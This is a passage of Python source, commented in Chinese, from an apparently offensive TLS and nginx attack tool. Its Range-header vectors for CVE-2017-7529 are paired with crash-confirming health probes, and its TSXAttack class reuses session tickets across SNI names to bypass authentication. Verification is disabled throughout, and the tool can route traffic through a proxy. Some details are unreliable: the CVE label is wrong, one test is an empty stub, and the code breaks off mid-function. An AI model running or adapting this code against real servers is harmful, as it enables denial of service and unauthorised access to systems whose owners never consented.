                    # 如果时间差异小于1个标准差，认为相似（软失败）
                    z_score = time_diff / pooled_std if pooled_std > 0 else 0
                    
                    if z_score < 1.0:  # 差异不显著，说明OCSP失败被忽略
                        confidence = "high" if z_score < 0.5 else "medium"
                        bypasses.append({
                            'type': 'ocsp_soft_fail',
                            'risk': 'OCSP validation failures are ignored (soft-fail mode)',
                            'exploitation': 'Use revoked certificates with unreachable OCSP responders',
                            'confidence': confidence,
                            'evidence': f'Time difference: {time_diff:.3f}s (Z-score: {z_score:.2f})',
                            'statistical_metrics': {
                                'no_ocsp_time': f'{no_ocsp_time:.3f}±{no_ocsp_std:.3f}s',
                                'invalid_ocsp_time': f'{invalid_ocsp_time:.3f}±{invalid_ocsp_std:.3f}s',
                                'z_score': z_score
                            }
                        })
                else:
                    # 回退到简单比较
                    if time_diff < 0.1:  # 100ms以内认为相似
                        bypasses.append({
                            'type': 'ocsp_soft_fail',
                            'risk': 'OCSP validation failures are ignored (soft-fail mode)',
                            'exploitation': 'Use revoked certificates with unreachable OCSP responders',
                            'confidence': 'low',
                            'evidence': f'Time difference: {time_diff:.3f}s (simple comparison)'
                        })
        
        return bypasses
    
    # 证书链生成与配置（完整实现）
    async def _generate_chain(self, length: int = 3, extensions: Optional[List[str]] = None, hash_algo: Optional[hashes.HashAlgorithm] = None, ocsp_url: Optional[str] = None) -> Dict[str, Any]:
        """生成指定长度的证书链并返回结构化对象供离线验证。
        返回字典包含: 'leaf' (x509.Certificate), 'intermediates' (List[x509.Certificate]), 'root' (x509.Certificate), 'length' (int)。
        """
        from cryptography import x509
        from cryptography.x509.oid import NameOID, ExtendedKeyUsageOID, AuthorityInformationAccessOID
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.backends import default_backend
        
        if length < 2:
            length = 2
        if hash_algo is None:
            hash_algo = hashes.SHA256()
        # 去重扩展，避免重复添加
        if extensions is not None:
            extensions = list(set(extensions))  # 去重
        else:
            extensions = []
        
        now = datetime.utcnow()
        not_before = now - timedelta(days=1)
        not_after = now + timedelta(days=365)
        
        # 生成各级密钥
        keys = [rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend()) for _ in range(length)]
        
        # Root CA
        root_name = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Timing Test Root CA"),
            x509.NameAttribute(NameOID.COMMON_NAME, "Timing Root")
        ])
        root_builder = (
            x509.CertificateBuilder()
            .subject_name(root_name)
            .issuer_name(root_name)
            .public_key(keys[-1].public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(not_before)
            .not_valid_after(not_after)
            .add_extension(x509.BasicConstraints(ca=True, path_length=length-2 if length>2 else 0), critical=True)
            .add_extension(x509.SubjectKeyIdentifier.from_public_key(keys[-1].public_key()), critical=False)
        )
        root = root_builder.sign(private_key=keys[-1], algorithm=hash_algo, backend=default_backend())
        
        # 中间CA链
        intermediates = []
        issuer_cert = root
        issuer_key = keys[-1]
        for i in range(length-2, 0, -1):
            name = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, f"Timing Interm {i}"),
                x509.NameAttribute(NameOID.COMMON_NAME, f"Interm-{i}")
            ])
            builder = (
                x509.CertificateBuilder()
                .subject_name(name)
                .issuer_name(issuer_cert.subject)
                .public_key(keys[i].public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(not_before)
                .not_valid_after(not_after)
                .add_extension(x509.BasicConstraints(ca=True, path_length=i-1 if i>1 else 0), critical=True)
                .add_extension(x509.SubjectKeyIdentifier.from_public_key(keys[i].public_key()), critical=False)
                .add_extension(x509.AuthorityKeyIdentifier.from_issuer_public_key(issuer_key.public_key()), critical=False)
            )
            interm = builder.sign(private_key=issuer_key, algorithm=hash_algo, backend=default_backend())
            intermediates.insert(0, interm)
            issuer_cert = interm
            issuer_key = keys[i]
        
        # 叶子证书
        leaf_name = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Timing Leaf"),
            x509.NameAttribute(NameOID.COMMON_NAME, self.target_host),
        ])
        leaf_builder = (
            x509.CertificateBuilder()
            .subject_name(leaf_name)
            .issuer_name(issuer_cert.subject)
            .public_key(keys[0].public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(not_before)
            .not_valid_after(not_after)
            .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        )
        # 应用扩展集合
        if 'key_usage' in extensions:
            from cryptography.x509 import KeyUsage
            leaf_builder = leaf_builder.add_extension(KeyUsage(digital_signature=True, key_encipherment=True,
                                                              key_cert_sign=False, crl_sign=False,
                                                              content_commitment=False, data_encipherment=False,
                                                              key_agreement=True, encipher_only=False, decipher_only=False), critical=True)
        if 'extended_key_usage' in extensions:
            eku = x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH, ExtendedKeyUsageOID.CLIENT_AUTH])
            leaf_builder = leaf_builder.add_extension(eku, critical=False)
        if 'subject_alt_name' in extensions:
            leaf_builder = leaf_builder.add_extension(x509.SubjectAlternativeName([x509.DNSName(self.target_host)]), critical=False)
        if 'crl_distribution_points' in extensions:
            cdp = x509.CRLDistributionPoints([x509.DistributionPoint(full_name=[x509.UniformResourceIdentifier(f"http://crl.{self.target_host}/crl.pem")], relative_name=None, reasons=None, crl_issuer=None)])
            leaf_builder = leaf_builder.add_extension(cdp, critical=False)
        if 'authority_key_identifier' in extensions:
            leaf_builder = leaf_builder.add_extension(x509.AuthorityKeyIdentifier.from_issuer_public_key(issuer_key.public_key()), critical=False)
        if 'subject_key_identifier' in extensions:
            leaf_builder = leaf_builder.add_extension(x509.SubjectKeyIdentifier.from_public_key(keys[0].public_key()), critical=False)
        
        # AIA/OCSP（如指定）
        if ocsp_url:
            aia = x509.AuthorityInformationAccess([
                x509.AccessDescription(AuthorityInformationAccessOID.OCSP, x509.UniformResourceIdentifier(ocsp_url))
            ])
            leaf_builder = leaf_builder.add_extension(aia, critical=False)
        
        leaf = leaf_builder.sign(private_key=issuer_key, algorithm=hash_algo, backend=default_backend())
        
        return {
            'leaf': leaf,
            'intermediates': intermediates,
            'root': root,
            'length': 2 + len(intermediates)
        }

class NginxCertVulnScanner:
    """nginx特有证书链漏洞扫描器 - 专门针对nginx/1.12.2等老版本"""
    
    def __init__(self, target_host, target_port=443, timeout=5.0):
        self.target_host = target_host
        self.target_port = target_port
        self.timeout = timeout
        self.nginx_version = None
        
    async def scan_nginx_cert_vulnerabilities(self, budget_seconds: float = None):
        """扫描nginx特有的证书链配置漏洞"""
        results = {
            'nginx_version': None,
            'vulnerabilities': [],
            'misconfigurations': [],
            'ssl_config_issues': []
        }
        deadline = None
        if budget_seconds and budget_seconds > 0:
            deadline = time.perf_counter() + float(budget_seconds)
        
        # 1. 检测nginx版本
        nginx_version = await self._detect_nginx_version()
        results['nginx_version'] = nginx_version
        
        if nginx_version:
            print(f"[*] Detected nginx version: {nginx_version}")
        
        # 2. 测试ssl_verify_client配置错误
        if deadline and time.perf_counter() > deadline:
            return results
        ssl_verify_issues = await self._test_ssl_verify_client_misconfig()
        results['vulnerabilities'].extend(ssl_verify_issues)
        
        # 3. 测试ssl_client_certificate配置问题
        if deadline and time.perf_counter() > deadline:
            return results
        client_cert_issues = await self._test_client_cert_config()
        results['vulnerabilities'].extend(client_cert_issues)
        
        # 4. 测试ssl_trusted_certificate配置错误
        if deadline and time.perf_counter() > deadline:
            return results
        trusted_cert_issues = await self._test_trusted_cert_config()
        results['vulnerabilities'].extend(trusted_cert_issues)
        
        # 5. 测试nginx特有的证书变量泄露
        if deadline and time.perf_counter() > deadline:
            return results
        cert_var_leaks = await self._test_cert_variable_leakage()
        results['misconfigurations'].extend(cert_var_leaks)
        
        # 6. 测试SSL会话复用配置问题
        if deadline and time.perf_counter() > deadline:
            return results
        session_issues = await self._test_ssl_session_config()
        results['ssl_config_issues'].extend(session_issues)
        
        # 7. 针对nginx/1.12.2的特定漏洞检测
        if deadline and time.perf_counter() > deadline:
            return results
        if nginx_version and "1.12" in nginx_version:
            old_version_vulns = await self._test_nginx_1_12_specific_vulns()
            results['vulnerabilities'].extend(old_version_vulns)
        
        return results
    
    async def _detect_nginx_version(self):
        """检测nginx版本"""
        try:
            response = await self._make_test_request('HEAD', '/')
            if response and 'headers' in response:
                server_header = response['headers'].get('Server', '')
                if 'nginx' in server_header.lower():
                    return server_header
            return None
        except Exception:
            return None
    
    async def _test_ssl_verify_client_misconfig(self):
        """测试ssl_verify_client配置错误"""
        issues = []
        
        # 测试场景1：ssl_verify_client optional但没有proper fallback
        try:
            # 尝试不带客户端证书的连接
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            sock = socket.create_connection((self.target_host, self.target_port), timeout=self.timeout)
            ssock = context.wrap_socket(sock, server_hostname=self.target_host)
            
            # 发送HTTP请求看是否获得特殊响应
            test_request = b"GET / HTTP/1.1\r\nHost: " + self.target_host.encode() + b"\r\nConnection: close\r\n\r\n"
            ssock.send(test_request)
            response = ssock.recv(4096).decode('utf-8', errors='ignore')
            
            # 检查是否有证书相关的错误信息泄露
            cert_error_indicators = [
                'ssl_client_verify',
                'client certificate',
                'certificate required',
                'ssl_client_s_dn',
                'x-ssl-client'
            ]
            
            for indicator in cert_error_indicators:
                if indicator.lower() in response.lower():
                    issues.append({
                        'type': 'ssl_verify_client_info_leak',
                        'severity': 'medium',
                        'evidence': f"Found certificate variable in response: {indicator}",
                        'description': 'ssl_verify_client configuration may leak certificate variables'
                    })
                    break
            
            ssock.close()
            
        except ssl.SSLError as e:
            # SSL错误可能表明证书验证配置
            if "certificate" in str(e).lower():
                issues.append({
                    'type': 'ssl_verify_client_enforced',
                    'severity': 'info',
                    'evidence': f"SSL error: {e}",
                    'description': 'Client certificate verification appears to be enforced'
                })
        except Exception:
            pass
        
        return issues
    
    async def _test_client_cert_config(self):
        """测试ssl_client_certificate配置问题"""
        issues = []
        
        # 测试不同场景下的mTLS配置行为差异
        test_scenarios = [
            ("admin-path", "/admin", {}),
            ("api-path", "/api", {}),
            ("management-path", "/management", {}),
            ("ssl-hint", "/", {"X-SSL-Verify": "required"}),
            ("cert-hint", "/", {"User-Agent": "SSLClient/1.0"}),
            ("client-cert-hint", "/", {"X-Client-Certificate": "needed"}),
        ]
        
        # 获取基线响应（普通请求）
        baseline_response = await self._make_test_request("/")
        baseline_status = baseline_response.get('status', 0) if baseline_response else 0
        
        for scenario_name, path, extra_headers in test_scenarios:
            try:
                response = await self._make_test_request(path, extra_headers=extra_headers)
                
                if response:
                    status = response.get('status', 0)
                    body = response.get('body', '').lower()
                    headers = response.get('headers', {})
                    
                    # 检测SSL/证书相关的行为差异
                    ssl_indicators = [
                        'ssl required', 'certificate required', 'client certificate',
                        'ssl_verify', 'ssl_client', 'certificate needed', 'mtls required'
                    ]
                    
                    # 检测状态码变化（可能表明不同的SSL要求）
                    if status != baseline_status and status in [400, 401, 403, 495, 496]:
                        ssl_behavior_detected = any(indicator in body for indicator in ssl_indicators)
                        
                        if ssl_behavior_detected or status in [495, 496]:  # nginx SSL状态码
                            issues.append({
                                'type': 'client_cert_config_detected',
                                'severity': 'medium',
                                'evidence': f"Path {path} shows SSL behavior: status {status}",
                                'description': f'Different SSL certificate requirements detected on {scenario_name}',
                                'scenario': scenario_name,
                                'baseline_status': baseline_status,
                                'test_status': status
                            })
                    
                    # 检测SSL相关头部泄露
                    ssl_headers = ['ssl-client', 'x-ssl', 'client-cert', 'certificate-status']
                    for header_name, header_value in headers.items():
                        if any(ssl_header in header_name.lower() for ssl_header in ssl_headers):
                            issues.append({
                                'type': 'ssl_header_leakage',
                                'severity': 'low',
                                'evidence': f"SSL header exposed: {header_name}: {header_value}",
                                'description': 'SSL configuration information leaked in HTTP headers',
                                'scenario': scenario_name
                            })
                    
                    # 检测SSL错误页面模式
                    if 'ssl' in body and 'certificate' in body and status >= 400:
                        issues.append({
                            'type': 'ssl_error_page_detected',
                            'severity': 'low', 
                            'evidence': f"SSL error content detected in {scenario_name}",
                            'description': 'SSL certificate error pages may reveal configuration details',
                            'scenario': scenario_name
                        })
                        
            except Exception:
                continue
        
        return issues
    
    async def _test_trusted_cert_config(self):
        """测试ssl_trusted_certificate配置错误"""
        issues = []
        
        # 测试CA证书验证绕过
        try:
            # 创建自签名证书进行测试
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_REQUIRED  # 要求证书验证
            
            try:
                sock = socket.create_connection((self.target_host, self.target_port), timeout=self.timeout)
                ssock = context.wrap_socket(sock, server_hostname=self.target_host)
                ssock.close()
                
                # 如果连接成功，可能配置了trusted CA
                issues.append({
                    'type': 'trusted_cert_config_detected',
                    'severity': 'info',
                    'evidence': 'SSL verification passed with default context',
                    'description': 'Server has proper trusted certificate configuration'
                })
                
            except ssl.SSLCertVerificationError:
                # 证书验证失败是正常的
                pass
                
        except Exception:
            pass
        
        return issues
    
    async def _test_cert_variable_leakage(self):
        """测试nginx证书变量泄露"""
        leaks = []
        
        # nginx特有的SSL变量
        nginx_ssl_vars = [
            '$ssl_client_verify',
            '$ssl_client_s_dn',
            '$ssl_client_i_dn',
            '$ssl_client_cert',
            '$ssl_client_raw_cert',
            '$ssl_client_serial',
            '$ssl_client_fingerprint'
        ]
        
        for var_name in nginx_ssl_vars:
            try:
                # 尝试通过不同方式触发变量泄露
                response = await self._make_test_request(extra_headers={
                    'X-Test-Var': var_name,
                    'User-Agent': f'Test/{var_name}'
                })
                
                if response and response.get('body'):
                    body = response['body'].lower()
                    
                    # 检查是否有变量名出现在响应中
                    if var_name.lower() in body or var_name.replace('$', '').lower() in body:
                        leaks.append({
                            'type': 'nginx_ssl_variable_leak',
                            'severity': 'medium',
                            'variable': var_name,
                            'evidence': f"Variable {var_name} found in response",
                            'description': 'nginx SSL variable exposed in HTTP response'
                        })
                        
            except Exception:
                continue
        
        return leaks
    
    async def _test_ssl_session_config(self):
        """测试SSL会话配置问题"""
        issues = []
        
        try:
            # 测试会话复用
            session_tickets = []
            
            for _ in range(2):
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                sock = socket.create_connection((self.target_host, self.target_port), timeout=self.timeout)
                ssock = context.wrap_socket(sock, server_hostname=self.target_host)
                
                # 检查会话信息
                session = ssock.session
                if session:
                    session_tickets.append(session)
                
                ssock.close()
            
            # 分析会话复用模式
            if len(session_tickets) > 1:
                # 简单检查：如果会话可复用，可能存在配置问题
                issues.append({
                    'type': 'ssl_session_reuse_enabled',
                    'severity': 'info',
                    'evidence': f'SSL session reuse detected',
                    'description': 'SSL session resumption is enabled'
                })
                
        except Exception:
            pass
        
        return issues
    
    async def _test_nginx_1_12_specific_vulns(self):
        """测试nginx 1.12.x特有漏洞"""
        vulns = []
        
        # nginx 1.12.2已知的SSL相关问题
        known_issues = [
            {
                'cve': 'CVE-2017-7529',
                'description': 'HTTP/2 integer overflow in range filter',
                'test_method': self._test_http2_range_overflow
            },
            {
                'cve': 'CVE-2018-16843',
                'description': 'HTTP/2 excessive memory consumption',
                'test_method': self._test_http2_memory_issue
            }
        ]
        
        for issue in known_issues:
            try:
                if await issue['test_method']():
                    vulns.append({
                        'type': 'nginx_version_vulnerability',
                        'severity': 'high',
                        'cve': issue['cve'],
                        'description': issue['description'],
                        'evidence': f"nginx 1.12.x vulnerable to {issue['cve']}"
                    })
            except Exception:
                continue
        
        return vulns
    
    async def _test_http2_range_overflow(self):
        """测试CVE-2017-7529 HTTP/2 range过滤器整数溢出"""
        
        # 多种攻击向量测试
        attack_vectors = [
            # 基础整数溢出
            {'Range': 'bytes=0-18446744073709551615'},
            # 负数范围
            {'Range': 'bytes=-1--1'},
            # 多重范围
            {'Range': 'bytes=0-1000, 18446744073709551615-18446744073709551616'},
            # 极大起始位置
            {'Range': 'bytes=18446744073709551614-'},
            # 混合攻击
            {'Range': 'bytes=0-4294967295, 4294967296-8589934591, 18446744073709551615-'},
        ]
        
        vulnerable_responses = []
        
        for i, headers in enumerate(attack_vectors):
            try:
                print(f"[*] Testing CVE-2017-7529 vector {i+1}/5...")
                
                # 发送攻击载荷
                response = await self._make_test_request(
                    method='GET',
                    path='/',
                    extra_headers=headers
                )
                
                if response:
                    status = response.get('status', 0)
                    response_time = time.time()
                    
                    # 健康探针 - 分级检测漏洞严重性
                    vuln_result = await self._classify_cve_response(status, response, headers['Range'], i+1)
                    
                    if vuln_result:
                        vulnerable_responses.append(vuln_result)
                        
                        if vuln_result['classification'] == 'exploitable':
                            print(f"[!] CRITICAL: CVE-2017-7529 vector {i+1} exploitable: {vuln_result['evidence']}")
                            break
                        elif vuln_result['classification'] == 'vulnerable':
                            print(f"[+] CVE-2017-7529 vector {i+1} vulnerable: {vuln_result['evidence']}")
                        elif vuln_result['classification'] == 'suspicious':
                            print(f"[?] CVE-2017-7529 vector {i+1} suspicious: {vuln_result['evidence']}")
                
                # 避免过快请求
                await asyncio.sleep(0.5)
                
            except Exception as e:
                # 连接重置等异常也可能表明漏洞
                vulnerable_responses.append({
                    'vector': i+1,
                    'range_header': headers['Range'],
                    'status': 0,
                    'error': str(e),
                    'severity': 'high'
                })
                print(f"[+] CVE-2017-7529 vector {i+1} caused exception: {e}")
        
        return len(vulnerable_responses) > 0
    
    async def _classify_cve_response(self, status, response, range_header, vector_num):
        """分级检测CVE-2017-7529响应严重性"""
        # 416是正常响应，不是漏洞
        if status == 416:
            return None
            
        # 立即表明严重问题的状态码
        critical_statuses = [500, 502, 503, 0]  # 服务器错误、网关错误、服务不可用、连接重置
        
        # 异常响应体大小（可能内存泄露）
        body_size = len(response.get('body', ''))
        abnormal_body = body_size > 50000  # 超过50KB视为异常
        
        if status in critical_statuses or abnormal_body:
            # 发送健康探针确认服务状态
            health_result = await self._enhanced_health_probe()
            
            if health_result['crashed']:
                return {
                    'vector': vector_num,
                    'range_header': range_header,
                    'status': status,
                    'body_length': body_size,
                    'classification': 'exploitable',
                    'evidence': f"DoS confirmed - {health_result['evidence']}",
                    'severity': 'critical'
                }
            elif health_result['degraded']:
                return {
                    'vector': vector_num,
                    'range_header': range_header,
                    'status': status,
                    'body_length': body_size,
                    'classification': 'vulnerable',
                    'evidence': f"Service degradation - {health_result['evidence']}",
                    'severity': 'high'
                }
        
        # 其他可疑响应
        if status in [400, 413, 414] or body_size > 10000:
            return {
                'vector': vector_num,
                'range_header': range_header,
                'status': status,
                'body_length': body_size,
                'classification': 'suspicious',
                'evidence': f"Abnormal response (status: {status}, size: {body_size})",
                'severity': 'medium'
            }
            
        return None
    
    async def _enhanced_health_probe(self):
        """增强型健康探针 - 数学精度的服务状态检测"""
        import time
        
        probe_results = []
        baseline_times = []
        
        # 建立响应时间基线（3次正常请求）
        for i in range(3):
            try:
                start = time.perf_counter_ns()
                response = await self._make_test_request(
                    method='HEAD',
                    path='/',
                    extra_headers={'User-Agent': 'HealthProbe-Baseline/1.0'}
                )
                end = time.perf_counter_ns()
                
                if response and response.get('status', 0) > 0:
                    baseline_times.append(end - start)
                    probe_results.append({'success': True, 'status': response['status'], 'time_ns': end - start})
                else:
                    probe_results.append({'success': False, 'reason': 'no_response'})
                    
                await asyncio.sleep(0.2)
                
            except Exception as e:
                probe_results.append({'success': False, 'reason': f'exception: {str(e)}'})
        
        # 统计分析
        successful_probes = [p for p in probe_results if p['success']]
        failure_rate = (len(probe_results) - len(successful_probes)) / len(probe_results)
        
        # 服务完全崩溃
        if failure_rate >= 0.67:  # 67%以上失败
            return {
                'crashed': True,
                'degraded': False,
                'evidence': f"Service crash confirmed ({failure_rate:.1%} failure rate)"
            }
        
        # 服务性能严重下降
        if baseline_times and len(baseline_times) >= 2:
            avg_time = sum(baseline_times) / len(baseline_times)
            # 如果平均响应时间超过3秒，认为服务严重退化 - 更敏感的DoS检测
            if avg_time > 3_000_000_000:  # 3秒 = 3*10^9 纳秒
                return {
                    'crashed': False,
                    'degraded': True,
                    'evidence': f"Severe performance degradation ({avg_time/1_000_000_000:.1f}s avg response)"
                }
        
        # 服务轻微问题
        if failure_rate > 0:
            return {
                'crashed': False,
                'degraded': True,
                'evidence': f"Service instability ({failure_rate:.1%} failure rate)"
            }
        
        # 服务正常
        return {
            'crashed': False,
            'degraded': False,
            'evidence': "Service operating normally"
        }

    async def _verify_service_crash(self):
        """验证服务是否真的崩溃了"""
        try:
            # 等待2秒让服务有时间恢复
            await asyncio.sleep(2)
            
            # 发送正常请求测试服务状态
            response = await self._make_test_request(
                method='GET',
                path='/',
                extra_headers={'User-Agent': 'HealthCheck/1.0'}
            )
            
            # 如果无响应或异常状态，可能确实crashed
            if not response or response.get('status', 0) == 0:
                return True
                
            # 检查响应时间异常（重启后可能很慢）
            if 'error' in response:
                return True
                
        except Exception:
            return True  # 异常也表明服务有问题
            
        return False
    
    async def _test_http2_memory_issue(self):
        """测试HTTP/2内存消耗问题"""
        try:
            # 简化测试：发送多个并发请求
            # 实际场景中需要构造特殊的HTTP/2帧
            return False
            
        except Exception:
            pass
        
        return False
    
    async def _make_test_request(self, method='GET', path='/', extra_headers=None):
        """发送测试HTTP请求"""
        try:
            import ssl, asyncio

            headers = {
                'Host': self.target_host,
                'Connection': 'close',
                'User-Agent': 'CertRebel/1.0'
            }
            if extra_headers:
                headers.update(extra_headers)

            # 组装请求
            request = f"{method} {path} HTTP/1.1\r\n" + \
                      "".join(f"{k}: {v}\r\n" for k, v in headers.items()) + "\r\n"

            # 建立异步连接（HTTP 或 HTTPS）
            if self.target_port == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    proxy_open_connection(PROXY_URL, self.target_host, self.target_port, ssl_context=ctx, server_hostname=self.target_host) if PROXY_ENABLED and PROXY_AVAILABLE else asyncio.open_connection(self.target_host, self.target_port, ssl=ctx, server_hostname=self.target_host),
                    timeout=self.timeout
                )
            else:
                reader, writer = await asyncio.wait_for(
                    proxy_open_connection(PROXY_URL, self.target_host, self.target_port) if PROXY_ENABLED and PROXY_AVAILABLE else asyncio.open_connection(self.target_host, self.target_port),
                    timeout=self.timeout
                )

            # 发送请求
            writer.write(request.encode('latin-1'))
            await writer.drain()

            # 读取响应到 EOF
            raw = await asyncio.wait_for(reader.read(-1), timeout=self.timeout)
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass

            # 解析响应
            txt = raw.decode('latin-1', errors='ignore')
            head, body = (txt.split("\r\n\r\n", 1) + [""])[:2]
            lines = head.split("\r\n")
            status_line = lines[0] if lines else ""
            try:
                status = int(status_line.split(" ")[1])
            except Exception:
                status = -1  # 解析失败标记，避免与真实HTTP状态码混淆
            resp_headers = {}
            for line in lines[1:]:
                if ":" in line:
                    k, v = line.split(":", 1)
                    resp_headers[k.strip()] = v.strip()

            return {
                'status': status,
                'headers': resp_headers,
                'body': body[:2048],
                'length': len(body)
            }

        except Exception as e:
            return {'status': 0, 'headers': {}, 'body': '', 'length': 0, 'error': str(e)}

class TSXAttack:
    """TSX跨SNI会话恢复绕过攻击"""
    
    def __init__(self, target_host, target_port=443, timeout=5.0):
        self.target_host = target_host
        self.target_port = target_port
        self.timeout = timeout
        self.session_ticket = None
        self.session_id = None
        
        # 初始化内存session池 - 解决SSLSession不能pickle的问题
        self.session_pool = {}  # {weak_sni: session_data}
        self.session_stats = {'total_sessions': 0, 'active_sessions': 0}
    
    def get_session_stats(self):
        """获取内存session池统计信息"""
        try:
            # 更新活跃session统计
            self.session_stats['active_sessions'] = sum(1 for s in self.session_pool.values() 
                                                      if time.time() - s['timestamp'] < 3600)
            
            available_snis = list(self.session_pool.keys())
            
            print(f"[+] Memory Session Pool Stats:")
            print(f"    ├─ Total sessions: {self.session_stats['total_sessions']}")
            print(f"    ├─ Active sessions: {self.session_stats['active_sessions']}")
            print(f"    └─ Available SNIs: {', '.join(available_snis[:5])}")
            
            return self.session_stats
        except:
            return {'total_sessions': 0, 'active_sessions': 0}
    
    def _dump_session(self, weak_sni, session_data):
        """将session数据存储到内存池"""
        try:
            # 直接存储到内存池
            self.session_pool[weak_sni] = session_data
            
            # 更新统计
            self.session_stats['total_sessions'] = len(self.session_pool)
            self.session_stats['active_sessions'] = sum(1 for s in self.session_pool.values() 
                                                      if time.time() - s['timestamp'] < 3600)
            
            print(f"[+] Session stored in memory pool: {weak_sni}")
            return True
        except Exception as e:
            print(f"[-] Failed to store session: {e}")
            return False
    
    def _load_session(self, weak_sni):
        """从内存池加载session数据"""
        try:
            if weak_sni in self.session_pool:
                session_data = self.session_pool[weak_sni]
                print(f"[+] Session loaded from memory pool: {weak_sni}")
                return session_data
            else:
                return None
        except Exception as e:
            print(f"[-] Failed to load session: {e}")
            return None
    
    def cleanup_sessions(self):
        """清理内存session池"""
        try:
            cleared_count = len(self.session_pool)
            self.session_pool.clear()
            self.session_stats = {'total_sessions': 0, 'active_sessions': 0}
            print(f"[+] Memory session pool cleaned up ({cleared_count} sessions)")
        except Exception as e:
            print(f"[-] Failed to cleanup sessions: {e}")
    
    async def test_session_persistence(self, weak_sni, strong_sni):
        """测试session持久性 - 过期时间和重用策略"""
        session_data = self._load_session(weak_sni)
        if not session_data:
            return {'error': 'No session data available'}
        
        # 计算session年龄
        session_age_seconds = time.time() - session_data['timestamp']
        
        persistence_results = {
            'session_age_seconds': round(session_age_seconds, 1),
            'session_age_readable': f"{int(session_age_seconds//60)}m{int(session_age_seconds%60)}s",
            'tests': []
        }
        
        print(f"[*] Testing session persistence for {weak_sni} (age: {persistence_results['session_age_readable']})")
        
        # 测试1: 立即重用session
        test_result = await self._test_session_reuse(session_data['session'], strong_sni, 'immediate_reuse')
        persistence_results['tests'].append(test_result)
        
        # 测试2: 如果session较新，测试多次重用
        if session_age_seconds < 300:  # 5分钟内
            for i in range(2, 4):  # 再测试2次
                test_result = await self._test_session_reuse(session_data['session'], strong_sni, f'reuse_attempt_{i}')
                persistence_results['tests'].append(test_result)
                await asyncio.sleep(1)  # 间隔1秒
        
        # 分析持久性模式
        successful_reuses = sum(1 for t in persistence_results['tests'] if t['resumed'])
        persistence_results['summary'] = {
            'total_attempts': len(persistence_results['tests']),
            'successful_reuses': successful_reuses,
            'persistence_rate': round(successful_reuses / len(persistence_results['tests']), 2) if persistence_results['tests'] else 0,
            'estimated_lifetime': 'persistent' if successful_reuses > 0 else 'expired'
        }
        
        print(f"    └─ Persistence: {successful_reuses}/{len(persistence_results['tests'])} successful reuses")
        
        return persistence_results
    
    async def _test_session_reuse(self, session, strong_sni, test_name):
        """测试单次session重用 - pyOpenSSL版本"""
        if not PYOPENSSL_AVAILABLE:
            return {'test_name': test_name, 'error': 'pyOpenSSL not available', 'success': False}
            
        # 使用asyncio.to_thread执行阻塞的pyOpenSSL操作
        return await asyncio.to_thread(self._sync_test_session_reuse, session, strong_sni, test_name)
    
    def _sync_test_session_reuse(self, session, strong_sni, test_name):
        """同步版本session重用测试"""
        try:
            start_time = time.perf_counter()
            
            # 创建新的pyOpenSSL上下文 - 修复：强制TLS版本并启用客户端session缓存
            ctx = SSL.Context(SSL.TLSv1_2_METHOD)  # 强制TLS 1.2
            ctx.set_verify(SSL.VERIFY_NONE, lambda c, x, e, d, ok: True)
            ctx.set_options(SSL.OP_NO_SSLv2 | SSL.OP_NO_SSLv3)
            # 关键修复：启用客户端session缓存（pyOpenSSL正确方法）
            ctx.set_session_cache_mode(SSL.SESS_CACHE_CLIENT)
            
            sock = socket.create_connection((self.target_host, self.target_port), self.timeout)
            
            # 创建SSL连接并设置session
            ssl_conn = SSL.Connection(ctx, sock)
            ssl_conn.set_tlsext_host_name(strong_sni.encode('utf-8'))
            ssl_conn.set_connect_state()
            ssl_conn.set_session(session)
            
            # 执行握手（使用安全函数）
            safe_do_handshake(ssl_conn, strong_sni, self.timeout)
            
            reuse_time = (time.perf_counter() - start_time) * 1000
            # Robust resumption inference: prefer native flag; fallback to timing delta
            resumed_flag = False
            try:
                if hasattr(ssl_conn, 'session_reused'):
                    resumed_flag = bool(ssl_conn.session_reused())
            except Exception:
                resumed_flag = False
            
            # 简单HTTP测试
            app_status = 'unknown'
            try:
                http_request = f"GET / HTTP/1.1\r\nHost: {strong_sni}\r\nConnection: close\r\n\r\n"
                ssl_conn.send(http_request.encode())
                response = ssl_conn.recv(1024).decode('utf-8', errors='ignore')
                app_status = response.split('\r\n')[0] if response else 'no_response'
            except:
                app_status = 'http_failed'
            
            ssl_conn.close()
            
            return {
                'test_name': test_name,
                'resumed': resumed_flag,
                'reuse_time_ms': round(reuse_time, 2),
                'app_status': app_status,
                'success': resumed_flag,
                'ssl_library': 'pyOpenSSL'
            }
            
        except Exception as e:
            return {
                'test_name': test_name,
                'resumed': False,
                'error': str(e),
                'success': False,
                'ssl_library': 'pyOpenSSL'
            }
    
    async def probe_weak_sni(self, weak_sni):
        """在弱门获取会话票据 - pyOpenSSL增强版"""
        if not PYOPENSSL_AVAILABLE:
            return await self._fallback_probe_weak_sni(weak_sni)
            
        # 使用asyncio.to_thread执行阻塞的pyOpenSSL操作
        return await asyncio.to_thread(self._sync_probe_weak_sni, weak_sni)
    
    def _sync_probe_weak_sni(self, weak_sni):
        """同步版本 - pyOpenSSL实现"""
        sock = None
        ssl_conn = None
        handshake_ok = False
        try:
            # 记录握手开始时间
            handshake_start = time.perf_counter()
            
            # 创建pyOpenSSL上下文
            ctx = SSL.Context(SSL.TLSv1_2_METHOD)
            ctx.set_verify(SSL.VERIFY_NONE, lambda c, x, e, d, ok: True)
